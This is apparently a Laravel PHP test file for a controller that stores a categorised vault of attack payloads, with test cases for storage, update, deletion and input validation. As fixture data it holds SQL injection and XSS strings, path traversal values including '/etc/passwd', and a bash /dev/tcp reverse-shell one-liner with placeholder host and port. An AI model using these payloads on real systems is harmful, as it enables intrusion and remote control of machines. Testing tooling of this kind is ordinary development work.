<?php

namespace Tests\Feature;

use App\Http\Controllers\PayloadController;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

class PayloadControllerTest extends TestCase
{
    use RefreshDatabase;

    private User $user;

    protected function setUp(): void
    {
        parent::setUp();

        Storage::fake('cyber');
        $this->user = User::factory()->create();
    }

    /**
     * Simpan payload lewat route store lalu baca kembali lewat source of truth (file).
     */
    private function storePayload(array $overrides = []): array
    {
        $this->actingAs($this->user)->post(route('payloads.store'), array_merge([
            'title' => 'Union Based SQLi',
            'category' => 'SQLi',
            'description' => 'Deskripsi payload',
            'content' => "1' UNION SELECT 1-- -",
        ], $overrides))->assertRedirect(route('payloads.index'));

        return app(PayloadController::class)->getAllPayloads();
    }

    private function indexPayloads(): array
    {
        $response = $this->actingAs($this->user)->get(route('payloads.index'))->assertOk();

        return $response->viewData('page')['props']['payloads'] ?? [];
    }

    public function test_index_returns_empty_list_when_vault_empty_and_creates_directory(): void
    {
        Storage::disk('cyber')->assertMissing('payloads');

        $this->assertSame([], $this->indexPayloads());

        // Direktori payloads dibuat otomatis oleh getAllPayloads()
        Storage::disk('cyber')->assertExists('payloads');
    }

    public function test_store_creates_category_file_with_correct_format(): void
    {
        $this->storePayload([
            'title' => 'Union Based SQLi',
            'category' => 'SQLi',
            'content' => "1' UNION SELECT 1-- -",
        ]);

        $this->assertSame(['payloads/SQLi.txt'], Storage::disk('cyber')->files('payloads'));

        $content = Storage::disk('cyber')->get('payloads/SQLi.txt');
        $this->assertStringContainsString('ID: ', $content);
        $this->assertStringContainsString('Judul: Union Based SQLi', $content);
        $this->assertStringContainsString('Deskripsi: Deskripsi payload', $content);
        $this->assertStringContainsString("Payload:\n1' UNION SELECT 1-- -", $content);
        $this->assertStringContainsString('--- END ---', $content);
    }

    public function test_store_then_read_back_returns_correct_data(): void
    {
        $payloads = $this->storePayload([
            'title' => 'Blind SQLi',
            'category' => 'SQLi',
            'description' => 'Boolean based',
            'content' => "1' AND 1=1-- -",
        ]);

        $this->assertCount(1, $payloads);

        $p = $payloads[0];
        $this->assertNotEmpty($p['id']);
        $this->assertSame('Blind SQLi', $p['title']);
        $this->assertSame('SQLi', $p['category']);
        $this->assertSame('Boolean based', $p['description']);
        $this->assertSame("1' AND 1=1-- -", $p['content']);
    }

    public function test_multiline_and_special_characters_content_roundtrip(): void
    {
        $content = "GET /?id=1' OR '1'='1 -- -\n\n<svg onload=alert(1)>\"quote\" 'single'\n\$var = \"test\" 日本語 & symbols;";
        $payloads = $this->storePayload(['title' => 'Karakter Khusus', 'content' => $content]);

        $this->assertCount(1, $payloads);
        $this->assertSame('Karakter Khusus', $payloads[0]['title']);
        $this->assertSame($content, $payloads[0]['content']);
    }

    public function test_update_payload_in_same_category(): void
    {
        $payloads = $this->storePayload(['title' => 'Judul Lama', 'content' => 'aaa']);
        $id = $payloads[0]['id'];

        $this->actingAs($this->user)->put(route('payloads.update', $id), [
            'title' => 'Judul Baru',
            'category' => 'SQLi',
            'description' => 'Deskripsi baru',
            'content' => 'bbb',
        ])->assertRedirect(route('payloads.index'));

        $all = app(PayloadController::class)->getAllPayloads();
        $this->assertCount(1, $all);
        $this->assertSame($id, $all[0]['id']);
        $this->assertSame('Judul Baru', $all[0]['title']);
        $this->assertSame('Deskripsi baru', $all[0]['description']);
        $this->assertSame('bbb', $all[0]['content']);
    }

    public function test_update_and_move_payload_to_another_category(): void
    {
        $payloads = $this->storePayload(['title' => 'Akan Pindah', 'category' => 'SQLi']);
        $id = $payloads[0]['id'];

        $this->actingAs($this->user)->put(route('payloads.update', $id), [
            'title' => 'Akan Pindah',
            'category' => 'XSS',
            'description' => '',
            'content' => 'alert(1)',
        ])->assertRedirect(route('payloads.index'));

        Storage::disk('cyber')->assertExists('payloads/XSS.txt');

        $all = app(PayloadController::class)->getAllPayloads();
        $this->assertCount(1, $all);
        $this->assertSame($id, $all[0]['id']);
        $this->assertSame('XSS', $all[0]['category']);

        // Payload tidak lagi berada di file kategori lama
        $oldFile = Storage::disk('cyber')->get('payloads/SQLi.txt');
        $this->assertStringNotContainsString((string) $id, $oldFile);
        $this->assertStringNotContainsString('alert(1)', $oldFile);
    }

    public function test_destroy_payload_removes_it(): void
    {
        $payloads = $this->storePayload();
        $id = $payloads[0]['id'];

        $this->actingAs($this->user)
            ->delete(route('payloads.destroy', $id))
            ->assertRedirect(route('payloads.index'));

        $this->assertSame([], app(PayloadController::class)->getAllPayloads());
    }

    public function test_destroy_nonexistent_payload_is_safe(): void
    {
        $this->actingAs($this->user)
            ->delete(route('payloads.destroy', 'tidak-ada'))
            ->assertRedirect();
    }

    public function test_category_path_traversal_is_rejected(): void
    {
        $payload = ['title' => 'x', 'content' => 'p'];

        foreach (['../../evil', '../evil', '..', '.', '/etc/passwd', 'a/b', '..\\evil', 'nul\0byte'] as $category) {
            $this->actingAs($this->user)->post(route('payloads.store'), $payload + ['category' => $category])
                ->assertSessionHasErrors('category');
        }

        // Tidak ada satu pun file yang dibuat di luar direktori payloads/
        $this->assertSame([], Storage::disk('cyber')->allFiles());
    }

    public function test_no_file_is_written_outside_payloads_directory(): void
    {
        $this->storePayload([
            'title' => 'PHP Reverse Shell',
            'category' => 'Reverse Shell',
            'content' => "bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1",
        ]);

        // Satu-satunya file yang ada adalah payloads/Reverse Shell.txt
        $this->assertSame(['payloads/Reverse Shell.txt'], Storage::disk('cyber')->allFiles());
    }

    public function test_content_containing_delimiter_is_rejected(): void
    {
        $this->actingAs($this->user)->post(route('payloads.store'), [
            'title' => 'x',
            'category' => 'SQLi',
            'content' => "abc\n--- END ---\ndef",
        ])->assertSessionHasErrors('content');

        $this->assertSame([], Storage::disk('cyber')->allFiles());
    }

    public function test_title_containing_delimiter_is_rejected(): void
    {
        $this->actingAs($this->user)->post(route('payloads.store'), [
            'title' => 'judul --- END --- rusak',
            'category' => 'SQLi',
            'content' => 'x',
        ])->assertSessionHasErrors('title');

        $this->assertSame([], Storage::disk('cyber')->allFiles());
    }
}